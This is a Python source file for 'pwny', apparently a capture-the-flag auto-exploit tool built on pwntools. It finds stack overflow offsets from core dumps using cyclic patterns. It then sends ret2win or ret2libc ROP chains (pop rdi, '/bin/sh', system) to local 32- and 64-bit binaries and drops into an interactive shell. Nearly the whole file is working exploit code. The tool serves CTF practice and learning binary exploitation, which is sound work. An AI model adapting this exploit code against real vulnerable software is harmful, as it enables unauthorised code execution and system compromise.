from sys import *
from pwn import *
from os import *
from termcolor import *

logging.disable(logging.CRITICAL)

def banner():
    asciib = """
                                                          
    ,-.----.                                      
    \    /  \                                     
    |   :    \                                    
    |   |  .\ :       .---.      ,---,            
    .   :  |: |      /. ./|  ,-+-. /  |           
    |   |   \ :   .-'-. ' | ,--.'|'   |     .--,  
    |   : .   /  /___/ \: ||   |  ,"' |   /_ ./|  
    ;   | |`-'.-'.. '   ' .|   | /  | |, ' , ' :  
    |   | ;  /___/ \:     '|   | |  | /___/ \: |  
    :   ' |  .   \  ' .\   |   | |  |/ .  \  ' |  
    :   : :   \   \   ' \ ||   | |--'   \  ;   :  
    |   | :    \   \  |--" |   |/        \  \  ;  
    `---'.|     \   \ |    '---'          :  \  \ 
      `---`      '---"                     \  ' ; 
                                            `--`  
    \n"""
    print(colored(asciib,'magenta',attrs=['bold']))

def fof(io):
    io.sendline(cyclic(1337))
    io.wait()
    core = io.corefile
    offset = cyclic_find(core.read(core.rsp,8))
    print(colored(f"OFFSET: {offset}",'yellow',attrs=['bold']))
    return offset

def fof32(io):
    io.sendline(cyclic(1337,n=4))
    io.wait()
    core = io.corefile
    offset = cyclic_find(core.fault_addr)
    print(colored(f"OFFSET: {offset}",'yellow',attrs=['bold']))
    return offset

def loc64(fname):
    elf = context.binary = ELF(fname)
    io = process(fname)
    rop = ROP(elf)

    offset = b"A"*fof(io)
    
    io = process(fname)
    ufunc = input(colored("Enter function for win(leave blank for not using this): ",'magenta',attrs=['bold']))

    if(len(ufunc)!=0 and ufunc != "\n"):
        win = elf.sym[ufunc[:-1]]
        payload = offset+p64(rop.find_gadget(['ret'])[0])+p64(win)
        io.sendline(payload)
        print(colored(f"RESULT: ",'green',attrs=['bold'])+io.recvall().decode())

    elif(elf.nx or not elf.nx and not elf.canary and not elf.pie):
        libc = io.libc
        pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
        ret = rop.find_gadget(['ret'])[0]
        system = libc.sym['system']
        sh = next(libc.search(b'/bin/sh'))
        payload = offset+p64(ret)+p64(pop_rdi)+p64(sh)+p64(system)
        io.sendline(payload)
        io.recv()
        io.sendline(b"echo 'You succesfully pwned a challenge. You entered in interactive shell mode. Type ls for more info.'")
        io.interactive()
    else:
        print("[x] Binary have protections")

def loc32(fname):
    elf = context.binary = ELF(fname)
    io = process(fname)

    offset = b"A"*fof32(io)

    io = process(fname)
    uflen = int(input(colored(f"Enter number of functions(enter 0 for not using this): ",'magenta',attrs=['bold'])))
    ufunc = []
    for g in range(0,uflen):
        temp = input(colored(f"Enter function name({g}): ",'magenta',attrs=['bold']))
        ufunc.append(temp[:-1])

    if(uflen != 0):
        args = []
        win = b""
        argo = int(input(colored("If u dont want to set arguments enter 0,else enter 1: ","magenta",attrs=['bold'])))
        if(argo == 1):
            for i in range(0,uflen):
                temp = input(colored(f"Argument(in hex)({i}): ",'magenta',attrs=['bold']))
                args.append(int(temp[:-1],16))
            for j in range(0,uflen):
                win += p32(elf.sym[ufunc[j]])+b"AAAA"+p32(int(args[j]))
            payload = offset+win
            io.sendline(payload)
            print(colored(f"RESULT: ",'green',attrs=['bold'])+io.recvall().decode())
        elif(argo == 0):
            payload = offset+p32(elf.sym[ufunc[0]])
            io.sendline(payload)
            print(colored(f"RESULT: ",'green',attrs=['bold'])+io.recvall().decode())
    
    elif(elf.nx or not elf.nx and not elf.canary and not elf.pie):
        libc = io.libc
        system = libc.sym['system']
        sh = next(libc.search(b'/bin/sh'))
        payload = offset+p32(system)+b"A"*4+p32(sh)
        io.sendline(payload)
        io.sendline(b"echo 'You succesfully pwned a challenge. You entered in interactive shell mode. Type ls for more info.'")
        io.interactive()
    else:
        print("[x] Binary have protections")


def main():
    if(len(argv) < 3):
        return(print("\nRun program: python pwny.py {option} {program}\n\nOPTIONS:\n\tlocal64\n\tlocal32\n\n\nINFO: Before running this be sure that you have location for core dumps: sudo sysctl -w kernel.core_pattern=core.%p.%u.%e\n"))
    prog = argv[2]
    banner()
    if(len(argv) == 3):
        op = argv[1]
        if(op == "local64"):
            loc64(prog)
        elif(op == "local32"):
            loc32(prog)

if __name__ == "__main__":
    main()